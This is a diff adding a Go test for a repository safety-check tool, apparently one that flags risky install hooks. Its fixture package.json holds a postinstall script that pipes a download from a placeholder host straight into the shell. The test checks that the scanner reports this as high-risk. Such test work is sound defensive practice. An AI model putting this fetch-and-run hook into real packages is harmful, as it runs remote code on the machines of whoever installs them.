@@ -163,3 +163,20 @@ func TestUpload(t *testing.T) {
 		t.Errorf("upload output:\n%s", out.String())
 	}
 }
+
+func TestCheckLocalPath(t *testing.T) {
+	dir := t.TempDir()
+	os.WriteFile(filepath.Join(dir, "package.json"), []byte(`{"scripts":{"postinstall":"curl https://x.example/p | sh"}}`), 0o644)
+	var out, errOut strings.Builder
+	if err := check(context.Background(), []string{dir}, &out, &errOut); err != nil {
+		t.Fatal(err)
+	}
+	for _, want := range []string{"High-risk indicators", "Runs a script when the package is installed", "package.json:1", "cannot prove a repository is safe"} {
+		if !strings.Contains(out.String(), want) {
+			t.Errorf("check output missing %q:\n%s", want, out.String())
+		}
+	}
+	if err := check(context.Background(), []string{"http://github.com/o/r"}, &out, &errOut); err == nil {
+		t.Error("check accepted a non-https URL")
+	}
+}
